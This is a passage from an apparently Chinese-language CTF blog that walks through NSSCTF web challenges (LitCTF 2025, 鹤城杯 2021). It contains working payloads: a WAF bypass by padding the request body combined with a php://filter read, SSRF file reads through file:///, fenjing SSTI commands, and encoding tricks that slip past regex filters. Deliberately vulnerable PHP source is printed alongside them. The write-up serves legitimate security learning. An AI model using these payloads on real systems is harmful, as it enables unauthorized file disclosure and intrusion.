#FF8000&quot;</span>&gt;<span class="hljs-comment">//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span><br>&lt;/span&gt;<br>&lt;/code&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure><p>看deepseek解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>))<br></code></pre></td></tr></table></figure><p>其中有&amp;&amp;效果与and相同，若是两个条件达成就会执行if<br>其中第一条是请求体长度小于800，第二是传入中含有flag字符<br>只要让其中一条为假就能绕过waf<br>所以让post的请求体长度大于800即可<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php&amp;a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><h1 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h1><p>开题先是无法访问，扫目录扫出这些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[01:51:25] 301 -  169B  - /api  -&gt;  http://node6.anna.nssctf.cn/api/<br>[01:51:26] 301 -  169B  - /backup  -&gt;  http://node6.anna.nssctf.cn/backup/<br>[01:51:29] 302 -    0B  - /dashboard.php  -&gt;  /login.html<br>[01:51:34] 200 -    6KB - /login.html<br>[01:51:34] 200 -   51B  - /login.php<br></code></pre></td></tr></table></figure><p>访问login.php<br>回显：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">400</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>53c2<span class="hljs-char escape_">\u</span>6570<span class="hljs-char escape_">\u</span>4e0d<span class="hljs-char escape_">\u</span>5b8c<span class="hljs-char escape_">\u</span>6574&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>访问html<br>到一个登录界面  </p><p>抓包尝试了一下，发现username和password是md5加密过的</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>f6b57bb04015bf000f17e5d5dda37935<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-apache"><span class="hljs-attribute">username</span>=ee11cbb19052e40b07aac0ca060c23ee&amp;password=<span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&amp;timestamp=<span class="hljs-number">1748714891098</span></span><br></code></pre></td></tr></table></figure><p>尝试对admin 密码爆破没结果<br>user 尝试一直提示账户错误没结果<br>去看wp<br>说是有api口能知道有地方能ssrf  </p><p>浏览器中f12查看网络去向能看到一个api地址  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:28934/api.js<br>访问看到：<br>/api/sys/urlcode.php?url=<br></code></pre></td></tr></table></figure><p>然后  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">28934</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/login.php<br><br>看不见哦<br></code></pre></td></tr></table></figure><p><a href="http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php">http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$url</span>)&#123;<br><br>    <span class="hljs-variable">$forbidden_protocols</span> = [<span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;zlib://&#x27;</span>, <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;glob://&#x27;</span>, <span class="hljs-string">&#x27;phar://&#x27;</span>, <span class="hljs-string">&#x27;ssh2://&#x27;</span>, <span class="hljs-string">&#x27;rar://&#x27;</span>, <span class="hljs-string">&#x27;ogg://&#x27;</span>, <span class="hljs-string">&#x27;expect://&#x27;</span>];<br>    <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$forbidden_protocols</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$proto</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-variable">$proto</span>) === <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$log_block</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;.log&#x27;</span>) !== <span class="hljs-literal">false</span>;  <br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$protocol_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：不允许使用 <span class="hljs-subst">&#123;$proto&#125;</span> 协议&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$log_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：URL 包含 .log&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;dashboard.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看不见哦&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b--&gt;</span><br></code></pre></td></tr></table></figure><p>然后看到里面有个327a6c4304ad5938eaf0efb6cc3e53dc.php<br>在主解析访问直接得到flag  </p><p>看到有大佬写马的wp<br><a href="https://www.cnblogs.com/TouHp/p/18895822">https://www.cnblogs.com/TouHp/p/18895822</a><br>看不懂，先供着  </p><h1 id="LitCTF-2025-星愿信箱"><a href="#LitCTF-2025-星愿信箱" class="headerlink" title="[LitCTF 2025]星愿信箱"></a>[LitCTF 2025]星愿信箱</h1><p>原来这题直接用fenjing就能梭出来的，这倒是发现了我环境的问题<br>以前是直接在powershell 跑fenjing web ui 版，<br>一直跑不出来<br>去式了别人wp的fenjing指令也不行，<br>给d导看了，原来是powershell的字符需要转译  </p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">原指令：  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>  <br>用不出来，一直提示报错  <br><br><span class="hljs-string">d</span>导给的命令:  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>    <br><br></code></pre></td></tr></table></figure><p>要不说以后fenjing在linux里跑？<br>没用，在Linux下跑的fenjing webui 还是无法成功<br>看来只能用命令跑了</p><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>开题先见源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>只看一眼，看上去像是猜谜游戏，过滤了：<br>‘&#x2F;utils.php/*$&#x2F;i’<br>‘&#x2F;show_source&#x2F;‘   </p><p>但是又设置又’&#x2F;show_source&#x2F;‘成功传入后的结果，所以应该是能绕过正则过滤的<br>不管了，问ai  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 引入名为 utils.php 的文件，该文件可能包含一些辅助功能或变量定义。</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;guess&#x27; 的 POST 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 将 POST 请求中的 &#x27;guess&#x27; 参数值强制转换为字符串类型，并赋值给变量 $guess。</span><br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-comment">// 判断用户提交的猜测值 $guess 是否与变量 $secret 相等。</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-comment">// 如果猜测正确，将提示信息和 $flag 变量的值拼接后赋值给 $message。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果猜测错误，提示用户重新尝试。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;show_source&#x27; 的 GET 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在，则使用 highlight_file 函数高亮显示当前脚本文件的代码，并终止脚本运行。</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果不存在 &#x27;show_source&#x27; GET 参数，则调用 show_source 函数（可能在 utils.php 中定义）显示当前脚本的源代码。</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>basename($_SERVER[‘PHP_SELF’]) 是什么意思</strong><br>问了ai后<br>那我大概理解是返回当前客户请求的url的最后的文件名字，然后配合highlight_file显示源码  </p><p>所以是<br>先绕过  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看网上wp的办法是在url的实际路径上添加不影响路径解析的字符  </p><p>问ai找出能用的：  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">零宽度空格（Zero-Width Space）<br>编码：<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>B<br>描述：表示零宽度空格。<br>潜在影响：可能导致路径解析错误或绕过某些基于字符串匹配的安全检查。<br><br>其他 Unicode 空白字符<br>全角空格：<span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%A0</span>（全角空格）<br>半角空格：<span class="hljs-variable">%20</span>（普通空格）<br>中文标点符号：如 <span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span>（中文逗号）、<span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span>（中文句号）等<br>潜在影响：这些字符可能会被误认为普通空格或路径分隔符，从而绕过某些基于字符串匹配的安全检查。<br></code></pre></td></tr></table></figure><p>然后是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>的绕过<br>我看有wp是直接用<br>show+source直接绕过<br>问dp说不应该，正常是url编码下滑线来匹配显示源码的条件    </p><p><strong>继续追问:</strong><br>为什么这个转换会发生？<br>这是 PHP 的历史遗留行为（为了兼容 register_globals 时代），PHP 会自动转换参数名中的特定字符：</p><p>空格 → 下划线 _</p><p>点号 . → 下划线 _</p><p>其他特殊字符也会被转换</p><p>这是 PHP 的默认行为，可以在 php.ini 中通过 request_parameter_handling 配置，但默认是启用的。</p><hr><h2 id="title-note-38date-2025-06-21-23-33-35tags"><a href="#title-note-38date-2025-06-21-23-33-35tags" class="headerlink" title="title: note-38date: 2025-06-21 23:33:35tags:"></a>title: note-38<br>date: 2025-06-21 23:33:35<br>tags:</h2><h1 id="LitCTF-2025-君の名は"><a href="#LitCTF-2025-君の名は" class="headerlink" title="[LitCTF 2025]君の名は"></a>[LitCTF 2025]君の名は</h1><p>开题先给源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 显示当前文件的源代码</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 关闭所有错误报告</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 创建一个匿名函数，当调用时会执行`/readflag`命令</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><br><span class="hljs-comment">// 定义Taki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>; <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span 